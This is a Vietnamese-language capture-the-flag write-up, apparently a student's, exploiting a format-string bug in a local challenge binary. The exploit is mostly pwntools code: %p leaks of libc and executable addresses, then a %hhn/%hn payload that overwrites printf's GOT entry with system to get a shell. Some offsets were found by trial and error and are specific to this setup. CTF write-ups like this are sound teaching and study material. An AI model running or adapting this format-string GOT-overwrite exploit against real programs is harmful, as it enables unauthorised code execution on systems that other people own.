# IDA
Chương trình thực hiện nhập payload và ta để ý ở đây có lỗi FMT, nên ta có thể thay đổi got@printf thành system.
![image](https://user-images.githubusercontent.com/111769169/221399839-70442642-081e-4e39-a173-0d2b6c256df2.png)  
Đầu tiên ta cần leak được libc để tìm địa chỉ base  
Ở đây ta chú ý sẽ lấy libc ```0x007fffffffde78│+0x00f8: 0x007ffff7dbdd90  →  <__libc_start_call_main+128> mov edi, eax``` nên ta sẽ sử dụng %p để leak địa chỉ  
```python
#################
### Leak libc ###
#################
payload1 = b"%37$p"
r.sendlineafter(b">> ", b'1')
r.sendafter(b"payload: ", payload1)
r.recvuntil(b"submitted\n")
leak_libc = int(r.recvuntil(b"1. Submit", drop=True), 16)
libc.address = leak_libc - 0x1d90 - 0x28000
log.info("leak libc " + hex(leak_libc))
log.info("base " + hex(libc.address))
```
> Ở đây em kiểm tra lại địa chỉ system của chương trình ``` 0x7fcf79b90d60 ``` và địa chỉ sau khi tính toán ``` system 0x7fcf79bb8d60 ```  
> em thấy không giống nhau nên em đoán địa chỉ base của em tính sai nên em sẽ tính offset của system chương trình và địa chỉ system em tính là ``` 0x28000 ```
___
Tiếp theo ta sẽ leak địa chỉ exe để tìm base exe
Thì ta chọn địa chỉ nằm ``` 0x007fffffffde58│+0x00d8: 0x0000000040142b ``` vẫn dùng %p để leak và tính ra địa chỉ base exe
```python
### Leak exe ###
r.sendlineafter(b">> ", b"1")
payload2 = b"%33$p"
r.sendafter(b"payload: ", payload2)
r.recvuntil(b"submitted\n")
leak_exe = int(r.recvuntil(b"1. Submit", drop=True), 16)
exe.address = leak_exe - 0x42b
log.info("leak exe " + hex(leak_exe))
log.info("base exe " + hex(exe.address))
```
> tuy nhiên khi em chạy chương trình thì thấy địa chỉ printf@got của chương trình ```0x404040 printf@GLIBC_2.2.5``` và địa chỉ em tính ```0x00000000406040``` vẫn khác nhau do đó em lại tính offset ```-0x2000```
___
Tiếp đến ta sẽ OW GOT của printf
ở đây ta thấy sự khác biết của địa chỉ giữa GOT của printf ```printf@GLIBC_2.2.5  →  0x7ffff7df4770``` và địa chỉ hàm system ```0x7ffff7de4d60 <libc_system>```
khác biệt 3byte nên ta sẽ ghi đè 3 byte của printf

```python
part1 = (libc.sym['system']) & 0xff
part2 = (libc.sym['system']) >> 8 & 0xffff
log.info("system " + hex(libc.sym['system']))

payload3 = f'%{part1}c%10$hhn'.encode()
payload3 += f'%{part2 - part1}c%11$hn'.encode()
payload3 = payload3.ljust(0x20, b'A')
payload3 += p64(exe.got['printf'])
payload3 += p64(exe.got['printf']+1)

r.sendlineafter(b">> ", b"1")
r.sendafter(b"payload: ", payload3)

r.interactive()
```
> %hhn là ghi 1byte, %hn là 2byte, ta nên ghi đè 1 byte trước rồi mới ghi đè 2byte tiếp theo
___
Đến đây ta sẽ nhập ta chuỗi /bin/sh, có thể dùng script hoặc nhập tay =))
<details> <summary> script </summary>

  ```python
from pwn import *

r = process("./chall_patched")
exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
gdb.attach(r, gdbscript='''
b* payload+105
c           
           ''')
input()

### Leak libc ###
payload1 = b"%37$p"
r.sendlineafter(b">> ", b'1')
r.sendafter(b"payload: ", payload1)
r.recvuntil(b"submitted\n")
leak_libc = int(r.recvuntil(b"1. Submit", drop=True), 16)
libc.address = leak_libc - 0x1d90 - 0x28000
log.info("leak libc " + hex(leak_libc))
log.info("base " + hex(libc.address))

### Leak exe ###
r.sendlineafter(b">> ", b"1")
payload2 = b"%33$p"
r.sendafter(b"payload: ", payload2)
r.recvuntil(b"submitted\n")
leak_exe = int(r.recvuntil(b"1. Submit", drop=True), 16)
exe.address = leak_exe - 0x42b - 0x2000
log.info("leak exe " + hex(leak_exe))

### OW GOT ###
part1 = (libc.sym['system']) & 0xff
part2 = (libc.sym['system']) >> 8 & 0xffff
log.info("system " + hex(libc.sym['system']))

payload3 = f'%{part1}c%10$hhn'.encode()
payload3 += f'%{part2 - part1}c%11$hn'.encode()
payload3 = payload3.ljust(0x20, b'A')
payload3 += p64(exe.got['printf'])
payload3 += p64(exe.got['printf']+1)

r.sendlineafter(b">> ", b"1")
r.sendafter(b"payload: ", payload3)

r.interactive()
```
  
  ![image](https://user-images.githubusercontent.com/111769169/221409669-3bc13aef-a975-4bb3-80a2-0a1a981c99da.png)

  
</details>
